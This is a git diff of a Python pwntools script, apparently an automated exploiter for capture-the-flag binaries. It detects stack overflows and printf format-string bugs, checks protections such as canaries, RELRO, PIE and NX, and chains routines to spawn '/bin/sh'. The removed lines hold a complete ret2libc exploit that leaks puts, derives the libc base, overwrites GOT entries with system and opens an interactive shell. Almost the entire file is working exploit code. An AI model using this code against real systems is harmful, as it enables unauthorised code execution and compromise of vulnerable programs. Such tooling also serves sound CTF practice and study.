@@ -1,65 +1,82 @@
 from pwn import *
 from autopwner_helpers import *
+from autopwner_exploits import *
 import sys
 import time
 
+challenge_info = {}
+
 binary_name = sys.argv[1]
-elf=ELF(binary_name)
+elf = ELF(binary_name)
+
+challenge_info["binary_name"] = binary_name
+challenge_info["elf"] = elf
 
 bytes_in_an_address = 4
 pack_int = p32
 if (elf.bits == 64):
-    pack_int = p64
     bytes_in_an_address = 8
+    pack_int = p64
 print(elf.bits)
 
-offset_to_ebp = determine_offset_to_ebp(binary_name, elf)
+offset_to_ebp, num_junk_inputs_for_smashing = determine_offset_to_ebp(challenge_info)
 offset_to_return_address = offset_to_ebp + bytes_in_an_address
-print(offset_to_return_address)
 
-if elf.bits == 32:
-    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+printf_offset, num_junk_inputs_for_printf = determine_printf_offset(binary_name)
+
+challenge_info["bytes_in_an_address"] = bytes_in_an_address
+challenge_info["pack_int"] = pack_int
+challenge_info["offset_to_ebp"] = offset_to_ebp
+challenge_info["num_junk_inputs_for_smashing"] = num_junk_inputs_for_smashing
+challenge_info["offset_to_return_address"] = offset_to_return_address
+challenge_info["printf_offset"] = printf_offset
+challenge_info["num_junk_inputs_for_printf"] = num_junk_inputs_for_printf
+
+use_stack_smashing = True
+
+if (not elf.canary) and (num_junk_inputs_for_smashing != -1): # overflow definitely exists
+    print("Will use stack smashing")
+    print(offset_to_return_address)
+    print(num_junk_inputs_for_smashing)
+elif num_junk_inputs_for_printf != -1: # printf vulernability exists
+    print("Will use a printf vulnerability")
+    print(printf_offset)
+    use_stack_smashing = False
+elif num_junk_inputs_for_smashing != -1: # overflow may work
+    print("Canary exists, but will attempt stack smashing")
+    print(offset_to_return_address)
+    print(num_junk_inputs_for_smashing)
 else:
-    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    print("This binary is not compatible!")
+    exit()
 
-puts_offset_from_libc_base = libc.symbols['puts']
+challenge_info["use_stack_smashing"] = use_stack_smashing
 
-p = process(binary_name)
-intro = p.recv()
-print(intro)
+if (not elf.relro) or (elf.relro == "Partial"):
+    print("Attempting sledgehammer")
+    shell_achieved = sledgehammer(challenge_info)
+    if (shell_achieved):
+        exit()
 
-payload = b"A"*offset_to_return_address
+execve_gadgets = find_execve_gadgets(binary_name)
+challenge_info["execve_gadgets"] = execve_gadgets
 
-if (elf.bits == 32):
-    payload += sledgehammer32_payload1_after_offset(binary_name, elf)
-else:
-    payload += sledgehammer64_payload1_after_offset(binary_name, elf)
-    
-p.sendline(payload)
-print(payload)
-leak = p.recv()
-print(leak)
+if not elf.pie and execve_gadgets != -1:
+    print(execve_gadgets)
+    print('Attempting execve("/bin/sh")')
+    shell_achieved = execve_bin_sh_data_section(challenge_info)
+    if (shell_achieved):
+        exit()
 
-if elf.bits == 32:
-    puts_libc_address = readleak32(leak, puts_offset_from_libc_base)
-else:
-    puts_libc_address = readleak64(leak, puts_offset_from_libc_base)
+if not elf.nx: # and stack_leak_exists_or_possible
+    print("Attempting shellcode on stack")
+    #if (shell_achieved):
+        #exit()
 
-print(hex(puts_libc_address))
-libc_base_address = puts_libc_address - puts_offset_from_libc_base
-libc.address = libc_base_address
+# if win_function exists:
+    # print("Attempting to use a win function")
+    #if (shell_achieved):
+        #exit()
 
-# try:
-byte_diff = elf.got["gets"] - elf.got["puts"]
-# except:
-#     byte_diff = elf.got["fgets"] - elf.got["puts"]
-    
-if (byte_diff > 0):
-    num_gets = int(byte_diff/bytes_in_an_address)
-else:
-    num_gets = 0
-
-p.sendline(pack_int(libc.symbols["system"]) + pack_int(libc.symbols['gets'])*num_gets)
-p.sendline(b"/bin/sh\x00")
-p.interactive()
+print("This binary is not compatible!")
 
